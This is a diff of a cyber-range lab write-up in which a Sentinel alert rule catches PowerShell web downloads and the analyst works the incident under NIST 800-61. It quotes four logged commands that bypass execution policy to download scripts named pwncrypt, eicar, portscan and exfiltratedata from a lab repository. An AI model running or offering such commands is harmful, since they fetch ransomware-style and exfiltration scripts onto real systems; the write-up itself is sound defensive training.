@@ -23,7 +23,7 @@ When processes are executed/run on the local VM, logs will be forwarded to Micro
 
 ## Steps Taken
 
-### Part 1: Create Alert Rule (PowerShell Suspicious Web Request)
+## Part 1: Create Alert Rule (PowerShell Suspicious Web Request)
 
 Created a Sentinel scheduled query rule within Log Analytics that will discover when PowerShell is detected using Invoke-WebRequest to download content.
 
@@ -42,12 +42,39 @@ DeviceProcessEvents
 
 ---
 
-### Part 2: Wait for Alert to trigger an Incident
+## Part 2: Wait for Alert to trigger an Incident
 
 Once alert the alert triggered and created an incident, I assigned it to myself and proceeded to investigate the incident. 
 
 <img width="957" height="973" alt="IncidentSC" src="https://github.com/user-attachments/assets/52189051-6a0c-4a96-ac2c-2ed7dc4fb1b1" />
 
+## Part 3: Work Incident
+Next I worked the incident to completion, in accordance with the NIST 800-61: Incident Response Lifecycle
+
+### Preparation
+- Document roles, responsibilities, and procedures.
+Ensure tools, systems, and training are in place.
+**Preparation phase already in place, assuming the company has already done this.**
+
+### Detection and Analysis
+- Identify and validate the incident.
+- Investigate the Incident by Actions → Investigate 
+- Gather relevant evidence and assess impact.
+Upon investigating the triggered incident "DH - Suspicious PowerShell Web Request"
+
+It was discovered that the following commands were run on the machine:
+
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
+
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
+
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
+
+`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`
+
+
+…
+Check to make sure none of the downloaded scripts were actually executed
 
 **Query used to locate event:**
 
